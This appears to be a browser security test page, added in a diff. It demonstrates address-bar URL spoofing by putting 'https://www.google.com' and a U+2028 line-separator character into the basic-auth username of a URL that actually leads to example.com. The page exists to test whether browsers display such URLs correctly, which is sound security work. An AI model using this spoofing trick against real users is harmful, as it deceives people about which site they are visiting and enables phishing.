@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>URL Spoofing - Basic Auth Whitespace (2028)</title>
+    <script>
+        // eslint-disable-next-line no-unused-vars
+        function run() {
+            location = `https://www.google.com\u2028@example.com/`
+        }
+    </script>
+</head>
+
+<body>
+    <p><a href="../index.html">[Home]</a></p>
+    This test uses a unicode whitespace character (\u2028) inside the username field of the basicauth portion
+    of the URL to perform an address bar spoofing attack.
+    <button id="run" onclick="run()">run</button>
+</body>
+
+</html>
